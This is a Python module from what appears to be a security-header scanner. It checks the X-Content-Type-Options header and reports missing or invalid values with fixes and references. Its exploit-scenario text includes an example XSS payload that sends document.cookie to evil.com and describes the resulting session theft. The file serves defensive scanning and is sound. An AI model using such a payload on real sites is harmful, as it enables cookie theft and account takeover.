"""X-Content-Type-Options checker."""

from __future__ import annotations

from ..models import FindingStatus, HeaderFinding, Severity
from .base import BaseHeaderChecker


class XContentTypeChecker(BaseHeaderChecker):
    """
    X-Content-Type-Options: nosniff prevents browsers from MIME-sniffing
    a response away from the declared Content-Type.
    """

    header_name = "x-content-type-options"
    max_penalty = 10
    bonus = 0

    def check(self, headers: dict[str, str]) -> HeaderFinding:
        value = self._get(headers)

        if value is None:
            return HeaderFinding(
                header="X-Content-Type-Options",
                status=FindingStatus.MISSING,
                severity=Severity.MEDIUM,
                score_impact=-self.max_penalty,
                title="X-Content-Type-Options is missing",
                description=(
                    "Without this header, some browsers may 'sniff' the content type of a "
                    "response and execute it differently than intended. For example, a text "
                    "file containing script tags could be executed as JavaScript in older "
                    "browsers, enabling MIME-confusion attacks."
                ),
                recommendation=(
                    "Add one line to your server config:\n\n"
                    "  X-Content-Type-Options: nosniff\n\n"
                    "This is the only valid value — it tells browsers to trust the "
                    "Content-Type header exactly as sent."
                ),
                references=[
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"
                ],
                exploit_scenario=(
                    "MIME-confusion XSS attack:\n\n"
                    "1. Attacker uploads a file to example.com/uploads/photo.jpg\n"
                    "2. The file contains valid JPEG header bytes, followed by:\n"
                    "     <script>fetch('https://evil.com/?c='+document.cookie)</script>\n"
                    "3. Server serves it with Content-Type: image/jpeg\n"
                    "4. Without nosniff, IE and some Chrome versions 'sniff' the content\n"
                    "   and detect the script tags → re-interpret as text/html\n"
                    "5. Browser executes the JavaScript in the context of example.com\n"
                    "6. Session cookie stolen → account takeover\n\n"
                    "Also prevents CSS injection via MIME sniffing:\n"
                    "A JSON response containing CSS syntax can be loaded as a stylesheet\n"
                    "by a cross-origin page (link rel=stylesheet), enabling data exfiltration."
                ),
                exploit_references=[
                    "https://portswigger.net/web-security/file-upload",
                    "https://portswigger.net/web-security/cross-site-scripting/content-types",
                    "https://owasp.org/www-community/attacks/MIME_sniffing",
                    "https://github.com/BlackFan/content-type-research",
                    "https://fetch.spec.whatwg.org/#should-response-to-request-be-blocked-due-to-mime-type",
                ],
            )

        normalized = value.strip().lower()
        if normalized != "nosniff":
            return HeaderFinding(
                header="X-Content-Type-Options",
                status=FindingStatus.INVALID,
                severity=Severity.MEDIUM,
                score_impact=-8,
                title=f"X-Content-Type-Options has an unexpected value: '{value}'",
                description=(
                    "'nosniff' is the only defined value for this header. "
                    "An unrecognized value is ignored by browsers."
                ),
                current_value=value,
                recommendation="Set it to exactly 'nosniff'.",
                references=[
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"
                ],
            )

        return HeaderFinding(
            header="X-Content-Type-Options",
            status=FindingStatus.PRESENT,
            severity=Severity.MEDIUM,
            score_impact=0,
            title="X-Content-Type-Options: nosniff",
            description="MIME sniffing is disabled — browsers will honour the declared Content-Type.",
            current_value=value,
            references=[
                "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"
            ],
        )
